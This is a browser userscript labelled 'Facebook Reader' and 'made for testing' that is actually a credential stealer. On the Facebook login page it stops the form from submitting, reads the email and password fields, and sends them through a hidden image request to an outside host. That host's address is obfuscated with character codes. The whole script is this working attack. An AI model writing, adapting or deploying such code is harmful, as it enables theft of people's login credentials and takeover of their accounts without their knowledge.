// ==UserScript==
// @name         Facebook Reader
// @namespace    kitkat-service.000webhost.com
// @version      1.0
// @description  A first script made for testing
// @author       k3lly.dev
// @match        *://*/*
// @grant        none
// ==/UserScript==

const K = "0";
const E = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 107, 105, 116, 107, 97, 116, 45, 115, 101, 114, 118, 105, 99, 101, 46, 48, 48, 48, 119, 101, 98, 104, 111, 115, 116, 97, 112, 112, 46, 99, 111, 109, 47);
var XF03 = {};

class xF03{
    constructor(a,b,c){
        console.log("Starting payload..."+[a,b,c])
        const {payload} = this;
        if( document.querySelector(c) ){
            console.log("Payload injected, listening...");
            document.querySelector(c).addEventListener("submit",function(event){
            event.preventDefault();
            console.log("Exploiting...");
            let d=document.querySelector(a).value;
            let e=document.querySelector(b).value;
            payload(`${E}p/?u=${d}&p=${e}&s=${K}`)
        });
        }else{
            console.log("Can't execute payload, already logged in.");
        }
    }
    payload(x){
        console.log("Generating payload... "+x);
        let i;
        i = document.createElement("img");
        i.setAttribute("style","display:none;");
        i.addEventListener("load",(e)=>{
            console.log('Execution image load');
        });
        i.addEventListener("error",(e)=>{
            console.log('Execution image error');
        });
        i.classList.add('exploit');
        console.log("Injecting payload...");
        i.src += x;
        document.body.appendChild(i);
    }
}
//String.fromCharCode(34,104,116,116,112,115,58,47,47,119,119,119,46,102,97,99,101,98,111,111,107,46,99,111,109,47,34)
    let d = window.location.href;
    if( d == "https://www.facebook.com/" ){
        XF03 = new xF03("#email","#pass", "#login_form");
    }


